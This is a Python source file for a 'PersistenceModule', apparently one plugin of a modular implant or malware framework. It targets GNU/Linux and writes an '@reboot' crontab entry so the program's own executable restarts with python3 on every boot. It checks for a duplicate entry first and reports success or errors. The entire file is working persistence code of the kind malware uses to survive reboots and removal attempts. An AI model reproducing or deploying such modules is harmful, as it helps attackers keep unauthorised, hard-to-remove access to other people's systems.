# Library import
#from .. import InstallModuleInterface
from ... import InstallationModule
import subprocess
import os
import __main__
import traceback

# Classes definition
class PersistenceModule(InstallationModule):
    # Class properties definition
    MODULE_NAME = "PERSISTENCE_CRONTAB_LINUX"
    INSTALL_STAGE = InstallationModule.INSTALL_STAGE_PROINSTALL
    COMPATIBILITY = (InstallationModule.PLATFORM_GNU_LINUX, )

    #def __init__(self, container, system) -> None:
    #    super().__init__(container)
    
    # Private methods
    def _registry_crontab(self, crontab_entry: str) -> bool:
        try:
            # Get the current crontab registry
            current_crontab = subprocess.getoutput("crontab -l 2>/dev/null")

            # Validate for duplicates
            if crontab_entry in current_crontab: 
                print("[PersistenceGNULinux] Crontab entry already exists:", crontab_entry) 
                return True

            # Write the new entry
            new_cron = f"{current_crontab}\n{crontab_entry}\n"

            process = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            _, stderr = process.communicate(input=new_cron.encode())

            if process.returncode == 0:
                print(f"[Persistence] Crontab successfully updated for {self.MODULE_NAME}")
                return True
            else:
                print(f"[Persistence] Error updating crontab: {stderr.decode()}")
                return False
        except:
            traceback.print_exc()
            return False

    # Public methods
    def start(self) -> bool:
        # Get the current executable program path
        program_executable_filepath = self.system.virtual_file_system.query("PROCESS_SOURCE_FILEPATH")

        print("Program executable filepath:")
        print(program_executable_filepath)

        crontab_entry = f"@reboot /usr/bin/python3 {program_executable_filepath}"
        
        if self._registry_crontab(crontab_entry):
            return True
        else:
            return False
    
    def stop(self) -> bool:
        return True
    
    def configure(self, configurations) -> bool:
        return True